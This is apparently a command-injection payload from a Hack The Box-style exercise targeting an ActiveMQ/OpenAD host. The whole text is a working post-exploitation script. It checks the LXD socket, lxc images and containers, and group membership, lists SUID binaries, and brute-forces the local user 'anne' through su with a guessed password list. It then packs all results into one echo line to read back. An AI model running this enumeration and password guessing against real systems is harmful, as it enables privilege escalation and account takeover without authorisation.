list.value:
LXD_SOCK=$(ls -la /var/snap/lxd/common/lxd/unix.socket 2>&1);
LXC_BIN=$(which lxc 2>&1; ls -la /snap/bin/lxc 2>&1);
LXC_IMAGES=$(timeout 5 lxc image list 2>&1);
LXC_CONTAINERS=$(timeout 5 lxc list 2>&1);
GROUPS_MQ=$(id);
SUID=$(find / -perm -4000 -type f 2>/dev/null | head -20);
SU_PASS=$(for p in htb openad OpenAD king King123 activemq ActiveMQ password Password123 Password1 admin toor svc_mq mq123 "openad123" "OpenAD123" "King@123" "HTB_2024"; do echo -n "Testing $p: "; echo "$p" | timeout 2 su -c "echo SUCCESS_$p" anne 2>&1 | grep -q "SUCCESS_$p" && echo "PASSWORD_FOUND:$p" || echo "fail"; done);
echo "=LXD_SOCK=$LXD_SOCK=LXC=$LXC_BIN=LXC_IMG=$LXC_IMAGES=LXC_LIST=$LXC_CONTAINERS=ID=$GROUPS_MQ=SUID=$SUID=SU=$SU_PASS"
